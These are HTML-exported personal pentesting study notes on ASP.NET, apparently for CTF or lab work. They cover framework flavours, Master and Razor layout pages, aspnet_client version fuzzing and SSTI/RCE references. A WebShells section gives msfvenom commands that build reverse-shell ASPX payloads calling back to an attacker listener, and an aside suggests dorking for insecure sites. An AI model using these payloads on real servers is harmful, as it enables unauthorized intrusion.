<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ASP.NET</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ASP.NET</h1><br/><p><h1>Background</h1></p><p>ASP.NET &amp; Classic ASP<span style="color:#663e0e;"> </span></p><p>[Infrastructure 53, 63-65]</p><p></p><p><h2>Viewable DLL Files</h2></p><p>[CTF B 167-168]</p><p></p><p>Fuzzing and Crawling may reveal DLL files used by the Web App in Burpsuite&#39;s <strong>Sitemap</strong>.</p><p></p><p>These DLL files can be downloaded by Navigating to their respective URL.</p><p></p><p><h3>Analysis</h3></p><p>Proper analysis likely requires a Windows machine with Visual Studio (I think?)</p><p></p><p>May be able to get limited info using linux tools like <strong>strings</strong> or <strong>xxd</strong>, but it&#39;ll miss most of it.</p><p></p><p>May be able to use wine like, <strong>wine FILE.dll</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: I saw people reference use of Ghidra to analyze DLL files, but I couldn&#39;t get that working. Was I just using Ghidra wrong?</p><p></p><p><h2>Flavors of ASP.NET</h2></p><p>(AFAIK. Some info may be inaccurate, or at least incomplete. More research is needed.)</p><p>3 ways that ASP.NET can be implemented, &amp; each works differently despite being built off of ASP.NET. From oldest to newest-</p><p></p><p><h3>WebForms</h3><h2></h2></p><p><h2></h2><a href="https://www.reddit.com/r/csharp/comments/fwghyz/aspnet_web_forms_vs_mvc_in_laymans_terms/">WebForms vs MVC</a><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h3>MVC (Model-View-Controller)</h3><h2></h2></p><p><h2></h2>An app design model comprized of 3 interconnected parts. The Model (data), View (User Interface), &amp; the Controller (process that handles input). MVC is a commonly used model for modern UI in general (not just with ASP.NET).<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h3>Razor / Razor Pages</h3></p><p>May occasionally be referred to as ASP.NET MVVM (Model-View-ViewModel). Uses the<strong> .cshtml</strong> file ext.</p><p></p><p>Q: Is Razor just an add-on / modification of ASP.NET MVC, instead of an entirely new framework all together?</p><p></p><p><a href="https://stackify.com/asp-net-razor-pages-vs-mvc/">Razor vs MVC</a></p><p></p><p><h1>Classic ASP</h1></p><p><span style="color:#ff0000;">ASP</span> (aka Classic ASP)  <span style="color:#ff0000;">is ancient</span>. The latest ver, 3.0, was released in November 2000 as part of IIS 5.0.  The latest ver of IIS is 10.0, for context. Should be far less common than ASP.NET</p><p></p><p><a name="asp"></a><h1>ASP.NET </h1></p><p><span style="color:#ff0000;">ASPX</span> (aka <span style="color:#ff0000;">ASP.NET</span>)  <span style="color:#ff0000;">is modern</span>, &amp; runs on .NET framework. It allows the use of C#, VB.NET, XML and other languages.</p><p></p><p>Be sure you&#39;re using <strong><a href="file:///usr/share/webshells/aspx/cmdasp.aspx">aspx</a></strong><strong> </strong>instead of <strong>asp</strong> in <strong>/usr/share/webshells/</strong> (Try both if ASPX webshell isn&#39;t working)</p><p></p><p><h2>Master Pages &amp; Code Behind files (WebForms &amp; MVC)</h2><h1></h1></p><p><h1></h1>[Infrastructure 63-65]<h1></h1></p><p><h1></h1><span style="color:#060f94;text-decoration:underline;">Note</span>: <a href="Recon_+_Services--WebApp--Software--ASP.NET_25.html#razor">Razor</a> is has a similar concept, but the pages have different names &amp; a different implementaion.</p><p><h1></h1></p><p><h1></h1>Master Pages let you create a consistent layout for the pages of your Website, working like a template that webpages build off of. You create individual content pages, &amp; when these are Requested by a user, they&#39;re merged with the Master Page; the resulting output is a combination of the 2 (&quot;Master Pages can also be nested&quot;). A Master Page has the ext <strong>.master</strong> (e.g Site.Master or MySite.master), &amp; has a predefined  layout (e.g static text, HTML elements, &amp; server controls). It typically resides at Webroot. </p><p></p><p>The Master Page is identified by a special @ Master directive that  replaces the @ Page directive that is used for ordinary <strong>.aspx</strong> pages. It&#39;ll indicate the BE language used (likely C# or VB). Master Pages can be nested.</p><p></p><p><h3>RCE</h3></p><p><h1></h1></p><p><h1></h1><strong><h2>aspnet_client</h2></strong><h2> folder structure</h2></p><p>In Web Root, check for <strong>/aspnet_client/system_web/</strong> &amp; use the <a href="file:///usr/share/wordlists/seclists/Discovery/Web-Content/aspnet_client_structure">wordlist</a> I put together to fuzz from that location. Even if this dir doesn&#39;t contain anything accessible, it&#39;ll tell you ver of ASP.NET  (e.g directory <em>4_0_30319</em> means ver <em>4.0.30319</em>)</p><p></p><p><span class="subheading">Side Note</span>: Google dorking for <strong>system_web</strong> seems to show a lot of insecure websites. May be good for bounty hunting?</p><p></p><p><a name="razor"></a><h1>Razor</h1></p><p>[Infrastructure 53]</p><p></p><p><h2>Layout Pages</h2></p><p><a href="https://www.learnrazorpages.com/razor-pages/files/layout">Layout Pages</a> work like Master Pages. They can have any name as specified by the Layout property, but are often called <strong>_Layout.cshtml</strong>, with the leading underscore preventing them from being browsed directly. Standard practice is to specify the layout page in a <strong>_ViewStart.cshtml</strong> file, which affects all content pages in the folder in which it is placed, and all subfolders. The value passed to the <span style="color:#ff0000;">Layout property is either the name of the file without the extension, or the relative file path, rooted in the project</span>.</p><p></p><p><em>@{																																																						@{</em><em></em></p><p><em>    Layout = &quot;master.cshtml&quot;;																		OR																						 Layout = &quot;_Layout&quot;;</em><em></em></p><p><em>}</em>																																																							}</p><p></p><p>By default, the layout file is placed in the <strong>Pages/Shared</strong> folder, but it can be placed anywhere in the application folder structure. Use of the <strong>_ViewStart</strong> file to centralise the location of the layout makes updating to the new location easy:</p><p></p><p><em>    @{</em><em></em></p><p><em>        Layout = &quot;/Themes/MyTheme/_Layout.cshtml&quot;;</em><em></em></p><p><em>    }</em></p><p></p><p>You <span style="color:#ff0000;">can also specify the location of the layout in the Razor Page itself</span>. This will <span style="color:#ff0000;">override</span> the instruction set in the<strong><span style="color:#ff0000;"> _ViewStart </span></strong>file. If you don&#39;t want page to use the layout specified in the _ViewStart file, you can pass null to the Layout property:</p><p></p><p><em>    @{</em><em></em></p><p><em>        Layout = null;</em><em></em></p><p><em>    }</em></p><p></p><p>Layout pages can be nested, meaning you can specify the layout for a layout page.</p><p></p><p><a name="razor rce"></a><h3>RCE &amp; SSTI</h3></p><p>Razor lets you embed server-based code (VB or C#) into webpages, allowing for SSTI &amp; RCE. For ex, using<a href="https://www.schtech.co.uk/razor-pages-ssti-rce/"> .NET method</a> &amp; using<a href="https://niemand.com.ar/2017/05/05/from-404-and-default-pages-to-rce-via-cshtml-webshell/"> C# method</a></p><p></p><p><h1>WebShells</h1></p><p>Stageless payloads (shown below) can be used with normal listener. Try both x86 &amp; x64 based webshells! Experiment with port numbers.</p><p></p><p><h2>ASPX</h2></p><p><em>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.2.53 LPORT=135 -f aspx &gt; shellx64.aspx</em><em></em></p><p><em></em><em></em></p><p><em>msfvenom -p windows/shell_reverse_tcp LHOST=10.2.2.53 LPORT=135 -f aspx &gt; shell.aspx</em></p><p></p><p><h1>Tips</h1><ul><li>Careful with space vs tab indentation. It must be consistent throughout the file, &amp; vim may auto use one over the other. If done incorrectly, payload won&#39;t work, &amp; you likely wont get any indication as to why that happened.</li></ul></p><p><ul><li>If you can upload file (e.g via FTP), use an accessible dir to confirm that the uploaded file appears on this <a href="Recon_+_Services--WebApp_12.html">WebApp</a>. May not be uploading files to this Web Server, you may just be dealing with a backup location, etc.</li></ul></p></div>
</body>
</html>
